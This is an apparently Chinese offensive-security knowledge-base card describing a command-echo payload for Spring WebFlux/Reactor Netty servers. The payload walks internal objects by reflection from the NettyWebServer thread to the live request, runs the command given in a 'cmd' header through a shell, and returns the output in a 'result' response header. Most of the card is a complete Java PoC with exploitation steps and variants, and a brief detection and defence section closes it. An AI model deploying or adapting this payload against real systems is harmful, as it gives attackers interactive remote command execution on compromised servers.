---
id: web-java-framework-spring-webflux-netty-httpserveroperations-header-echo
title: Spring WebFlux/Netty 无 Servlet 回显：NettyWebServer→HttpServerConfig.channelGroup→channel.attributes→HttpServerOperations 取 request/response，命令输出写 result 响应头
type: scenario
domain: web
path: web/java/framework/spring
technique: webflux-netty-httpserveroperations-channelgroup-header-echo
tags:
- java
- spring
- webflux
- netty
- reactor-netty
- echo
- command-execution
- memshell
- reflection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V364
  verified_at: '2026-11-09T03:47:18+08:00'
  notes: 已对照原文全文与图01-36核对：图33-35 证实 HttpServerConfig.channelGroup(DefaultChannelGroup)→EpollSocketChannel.attributes(DefaultAttribute[])→value=HttpServerOperations→nettyRequest/nettyResponse；图29-30 与图36 分别演示与真实产品环境 result 响应头回显成功；图23-27 证实 DefaultHttpResponse 无 body 写 API、FullHttpResponse/writeAndFlush 尝试失败；图01-22 的 EventLoop/CodecOutputList 与 KQueue/NioEventLoop 两条弯路与原文一致。关键入口另用本地 Maven 的 spring-boot-2.6.13.jar javap 核实：NettyWebServer$1 extends java.lang.Thread，字段 val$disposableServer(DisposableServer) 与 this$0，故“线程类名含 NettyWebServer”及直接反射 val$disposableServer→config 在 2.6.13 成立。需注意的措辞/未验证点：原文“Thread 的 target 实际是 NettyWebServer 内部类”不准确，实际是该 Thread 的运行时类为 NettyWebServer 内部匿名 Thread 子类 NettyWebServer$1（target 非类名来源）；“KQueueEventLoop（macOS）常见”属泛化，文章 macOS demo 实际是 NioEventLoop+KQueueSelectorImpl（native KQueueEventLoop 为可选 transport）；JDK9+ 的 Thread.getThreads 可用性与 --add-opens 需实测；未运行 PoC，header 长度/CRLF 限制按原文推断。dedup 首候选为自身 exact，两条 related（RequestContextHolder 回显、SpEL 无回显外带）与三张 Netty/WebFlux
    内存马均非同一链；dup-scan.json（2026-11-08 19:10）早于建卡且无本卡 pair；无 sources/文章 ID/URL，path 合法；Spring Boot 2.6.13/netty 4.1.104 为演示环境，已 set-versions --clear。
url: /docs/web/java/framework/spring/web-java-framework-spring-webflux-netty-httpserveroperations-header-echo/
draft: false
kb_aliases:
- Netty 回显
- WebFlux 回显
- 无 servlet 回显
- HttpServerOperations
- HttpServerConfig channelGroup
- NettyWebServer
- reactor-netty 回显
- result 响应头回显
---

## 一句话结论

在 Spring WebFlux/Reactor Netty 环境中拿到一次 Java 代码执行后，由于没有 `javax.servlet`，无法用 `RequestContextHolder` 取 request/response；此时可从线程出发找到 `NettyWebServer` 线程，沿 `val$disposableServer → config(HttpServerConfig) → channelGroup → channel.attributes → DefaultAttribute.value → HttpServerOperations` 拿到当前请求的 `nettyRequest`/`nettyResponse`，读取 `cmd` 头执行命令，并把输出写进响应头 `result`——reactor-netty 的 `HttpResponse` 没有 body 写入方法，响应头回显是可用且通用的一步式回显方式。

## 原理

- **没有 servlet 上下文**：Spring WebFlux 默认使用 Reactor Netty，请求/响应是 Netty 的 `HttpRequest`/`HttpResponse`，`RequestContextHolder`、`HttpServletRequest` 均不存在；回显必须直接从对象图里找当前连接对应的 reactor-netty 对象。
- **通用对象链（最终版）**：
  1. `Thread.class.getDeclaredMethod("getThreads")`（JDK8）取所有线程；
  2. 找类名包含 `NettyWebServer` 的线程（`Thread` 的 `target` 实际是 `NettyWebServer` 内部类）；
  3. 反射 `val$disposableServer` → `config`（`reactor.netty.http.server.HttpServerConfig`）；
  4. `HttpServerConfig.channelGroup`（`DefaultChannelGroup`，记录所有已接入连接）；
  5. 遍历 `channelGroup` 中的 `Channel`，反射 `attributes`（`DefaultAttributeMap$DefaultAttribute[]`）；
  6. 每个 `DefaultAttribute` 继承 `AtomicReference`，其 `value` 即 `reactor.netty.http.server.HttpServerOperations`；
  7. `HttpServerOperations.nettyRequest`（`io.netty.handler.codec.http.HttpRequest`）与 `nettyResponse`（`HttpResponse`）。
- **为什么用 channelGroup 而不是 EventLoop**：文章先试过两条链——从 `DefaultLoopResources$EventLoop.threadLocalMap.indexedVariables` 找 `CodecOutputList$CodecOutputLists` 只能取到 `DefaultHttpRequest`（没有 response）；从 `NioEventLoop.unwrappedSelector` → `KQueueSelectorImpl.fdMap` → `SelectionKey.attachment` → `NioSocketChannel.attributes` 能取到 request+response，但只在 NIO 模型下成立。生产环境常见 `EpollEventLoop`（Linux）或 `KQueueEventLoop`（macOS），`NioEventLoop` 不存在，链路直接失效；`HttpServerConfig.channelGroup` 与 I/O 模型无关，因此在 NIO/Epoll/KQueue 等环境都通用。
- **为什么写响应头**：`HttpServerOperations.nettyResponse` 的静态类型是 `io.netty.handler.codec.http.HttpResponse`，`DefaultHttpResponse` 只有 `status()/headers()` 等方法，没有 body 写入 API。可行做法是 `httpResponse.headers().add("result", commandOutput)`：Netty 在发送响应时会把 header 写入返回包。响应头值不能含 CR/LF，命令输出里的换行要替换为空格（长输出可能受 header 大小限制）。
- **命令执行**：从 `httpRequest.headers().get("cmd")` 读命令；按 `os.name` 选择 `cmd.exe /c` 或 `/bin/sh -c`，`ProcessBuilder` 启动后用 `Scanner(...).useDelimiter("\\A").next()` 读取全部 stdout，转字符串写入 header。命令输出编码按平台默认字符集。
- **失败路径（负知识）**：尝试过从 pipeline tail/prev 拿 `DefaultChannelHandlerContext`、构造 `FullHttpResponse` 并反射 `ChannelOutboundInvoker.writeAndFlush`，实际未成功；也尝试过 `HttpServerOperations` 的 response 直接写 body，接口没有该能力。响应头回显虽然不优雅，但在真实产品环境实测成功。
- **一次性与持久化**：这是“已执行代码”的一次性回显载荷，不注册 Handler/Filter，不持久；若需持久化，见 Netty pipeline/ServerBootstrapAcceptor/WebFlux FilteringWebHandler 内存马卡片。
- **JDK 版本注意**：`Thread.getThreads()` 是 JDK8 的私有静态方法；JDK9+ 模块化后需要 `--add-opens java.base/java.lang=ALL-UNNAMED` 或用 `Thread.getAllStackTraces()`/`ThreadGroup` 遍历替代。

## 触发条件

- 目标为 Spring WebFlux / Reactor Netty（Spring Boot 2.x/3.x 默认），存在一次 Java 代码执行点（SpEL、反序列化、表达式注入、Agent 等），且代码在请求处理线程上运行。
- 当前请求尚未提交响应（`httpResponse` 仍可修改 headers）。
- 请求可携带自定义头（如 `cmd`），且网关/业务不会剥离该头。
- 能反射访问 `NettyWebServer` 线程/`HttpServerConfig`/`channelGroup`（JDK8 直接可用；JDK17 需绕过强封装或换公开线程枚举）。
- 响应头大小足以容纳命令输出（长输出需分块或改其他回显通道）。

## 利用步骤

1. **定位 NettyWebServer 线程**：`Thread.getThreads()` 或 `Thread.getAllStackTraces()`，筛选类名包含 `NettyWebServer` 的线程。
2. **取 HttpServerConfig**：线程对象反射 `val$disposableServer` → `config`；确认类型为 `HttpServerConfig`。
3. **遍历 channelGroup**：反射 `channelGroup`（`DefaultChannelGroup`），对每个 `Channel` 反射 `attributes`。
4. **取 HttpServerOperations**：遍历 `DefaultAttribute[]`，反射 `value`，判断是否为 `HttpServerOperations`；从中取 `nettyRequest`/`nettyResponse`。
5. **执行并回显**：`nettyRequest.headers().get("cmd")` 非空时，按平台启动 `cmd.exe /c` 或 `/bin/sh -c`，读取输出；`nettyResponse.headers().add("result", output.replace("\n"," "))`。
6. **收尾**：停止遍历（`stop` 标志），避免对多个连接重复执行；请求返回后查看 `result` 响应头。

## PoC

```java
import io.netty.handler.codec.http.HttpRequest;
import io.netty.handler.codec.http.HttpResponse;
import java.lang.reflect.*;
import java.util.Scanner;
import java.util.Set;

public class NettyEchoDemo {
    static {
        try {
            boolean stop = false;
            Method m = Thread.class.getDeclaredMethod("getThreads");
            m.setAccessible(true);
            Object threads = m.invoke(null);
            for (int i = 0; i < Array.getLength(threads) && !stop; i++) {
                Object thread = Array.get(threads, i);
                if (!thread.getClass().getName().contains("NettyWebServer")) continue;

                Object disposableServer = getFieldValue(thread, "val$disposableServer");
                Object httpServerConfig = getFieldValue(disposableServer, "config");
                Set<Object> channelGroup = getFieldValue(httpServerConfig, "channelGroup");

                for (Object channel : channelGroup) {
                    Object[] attributes = getFieldValue(channel, "attributes");
                    for (Object attribute : attributes) {
                        if (attribute == null) continue;
                        Object value = getFieldValue(attribute, "value");
                        Object request = getFieldValue(value, "nettyRequest");
                        Object response = getFieldValue(value, "nettyResponse");
                        if (request instanceof HttpRequest) {
                            HttpRequest req = (HttpRequest) request;
                            HttpResponse resp = (HttpResponse) response;
                            String cmd = req.headers().get("cmd");
                            if (cmd != null && !cmd.isEmpty()) {
                                String[] argv = System.getProperty("os.name").toLowerCase().contains("win")
                                        ? new String[]{"cmd.exe", "/c", cmd}
                                        : new String[]{"/bin/sh", "-c", cmd};
                                byte[] out = new Scanner(new ProcessBuilder(argv).start()
                                        .getInputStream()).useDelimiter("\\A").next().getBytes();
                                resp.headers().add("result", new String(out).replace("\n", " "));
                            }
                            stop = true;
                            break;
                        }
                    }
                    if (stop) break;
                }
            }
        } catch (Exception ignored) {
        }
    }

    private static <T> T getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field f = clazz.getDeclaredField(name);
                f.setAccessible(true);
                return (T) f.get(obj);
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return null;
    }
}
```

请求示例：`GET /hello`，带 `cmd: ifconfig` 或 `cmd: ip a`，响应头出现 `result: ...` 即命令输出（文章在真实产品环境用 `cmd: ip a` 成功）。

## 变体与关联

- **持久化内存马**：Netty `doOnChannelInit` 注入 Handler 见 [[web-java-component-netty-pipeline-memshell]]；替换 `ServerBootstrapAcceptor.childHandler` 见 [[web-java-component-netty-serverbootstrapacceptor-childhandler-memshell]]；WebFlux `FilteringWebHandler.chain` 注入 WebFilter 见 [[web-java-framework-spring-webflux-filteringwebhandler-memshell]]。这些需要新连接/新请求触发，且能写 body；本卡是一次性 header 回显。
- **Spring MVC 对照**：Servlet 环境可直接用 `RequestContextHolder` 取 request/response 并写 body，见 [[web-java-framework-spring-requestcontextholder-cmd-header-echo]]。
- **其他容器**：Undertow/Jetty 的对象图不同（`Undertow` 有 `ManagedFilter`/`HttpServerExchange`），需各自找 request/response；思路仍是“线程→容器对象→attribute→当前 exchange”。
- **JDK9+**：`Thread.getThreads()` 不可用时改用 `Thread.getAllStackTraces().keySet()` 或遍历 `ThreadGroup`；模块强封装需 `--add-opens` 或另找公开 API。
- **边界**：命令输出含 CR/LF 必须替换，否则 header 注入失败；超长输出可能被 Netty/代理截断；响应已提交时 headers 修改无效。

## 检测与防御

- **检测特征**：请求携带 `cmd`/`exec` 等自定义头；响应出现 `result` 等异常头；Java 进程反射 `Thread.getThreads`、`NettyWebServer`、`HttpServerConfig.channelGroup` 等对象图；子进程 `/bin/sh -c` 或 `cmd.exe /c` 由 Java 拉起。
- **防御**：RASP/Java Agent 监控反射遍历线程与容器内部对象、`ProcessBuilder` 调用；网关剥离未知请求头；禁用不必要的自定义头透传；对 SpEL/反序列化入口做拦截。
- **加固**：JDK17+ 强封装默认阻止 `Thread.getThreads` 反射（需显式 `--add-opens`，不要开启）；限制 WebFlux actuator/表达式入口；监控响应头异常长度与内容。
- **响应头限制**：可在反向代理层限制响应头大小/字符集，降低 header 回显通道可用性（但不能替代阻断代码执行）。
